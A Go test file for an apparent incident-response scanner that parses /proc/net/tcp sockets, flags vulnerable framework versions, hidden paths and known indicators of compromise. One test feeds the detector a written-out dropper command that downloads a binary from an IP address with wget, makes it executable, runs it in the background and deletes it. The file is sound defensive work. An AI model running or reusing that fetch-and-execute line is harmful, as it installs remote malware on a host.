package scan

import (
	"os"
	"path/filepath"
	"testing"
)

func TestHexAddr(t *testing.T) {
	ip, port := hexAddr("0E9B4C2D:01BB") // 45.76.155.14:443 little-endian
	if ip != "45.76.155.14" || port != 443 {
		t.Fatalf("got %s:%d", ip, port)
	}
	ip6, _ := hexAddr("00000000000000000000000001000000:0050")
	if ip6 != "::1" {
		t.Fatalf("ipv6 got %s", ip6)
	}
}

func TestReadSocketsFlagsIOC(t *testing.T) {
	dir := t.TempDir()
	f := filepath.Join(dir, "tcp")
	content := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
		"   0: 0100000A:D2F0 0E9B4C2D:01BB 01 00000000:00000000 00:00000000 00000000  0  0 12345 1 0 20 4 30 10 -1\n" +
		"   1: 0100007F:1F90 0100007F:D2F1 01 00000000:00000000 00:00000000 00000000  0  0 12346 1 0 20 4 30 10 -1\n" +
		"   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000  0  0 12347 1 0 20 4 30 10 -1\n"
	if err := os.WriteFile(f, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	socks := readSockets(f)
	if len(socks) != 1 || socks["12345"].remote != "45.76.155.14:443" {
		t.Fatalf("got %+v", socks)
	}
}

func TestNextVulnerable(t *testing.T) {
	cases := map[string]bool{"16.0.4": true, "16.0.6": true, "16.0.7": false, "16.1.0": false, "15.3.3": true, "15.3.6": false,
		"15.5.6": true, "15.5.7": false, "15.0.5": false, "14.2.30": false, "14.3.0-canary.80": true, "15.3.6-canary.1": true}
	for v, want := range cases {
		if got, _ := nextVulnerable(v); got != want {
			t.Errorf("%s: got %v want %v", v, got, want)
		}
	}
}

func TestDropperPatterns(t *testing.T) {
	iocs, err := loadIOCs(nil)
	if err != nil {
		t.Fatal(err)
	}
	s := &scanner{iocs: iocs}
	payload := "wget http://45.76.155.14/vim -O /tmp/vim ; chmod +x /tmp/vim ; nohup /tmp/vim > /dev/null 2>&1 & ; rm -f /tmp/vim"
	if hits := s.dropperHits(payload); len(hits) < 4 {
		t.Fatalf("expected several hits, got %v", hits)
	}
	if hits := s.dropperHits("curl -fsSL https://get.docker.com -o get-docker.sh\napt-get update"); len(hits) != 0 {
		t.Fatalf("false positive: %v", hits)
	}
}

func TestHidden(t *testing.T) {
	for p, want := range map[string]bool{"/tmp/.x/kworker": true, "/root/.cache/go/x": false, "/home/a/.ssh/id": true, "/tmp/vim": false} {
		if hidden(p) != want {
			t.Errorf("%s: want %v", p, want)
		}
	}
}

func TestIOCsLoad(t *testing.T) {
	i, err := loadIOCs(nil)
	if err != nil || i.sha["0f0f9c339fcc267ec3d560c7168c56f607232cbeb158cb02a0818720a54e72ce"] == "" || i.ip["45.76.155.14"] == "" {
		t.Fatalf("built-in IOCs missing: %v", err)
	}
}
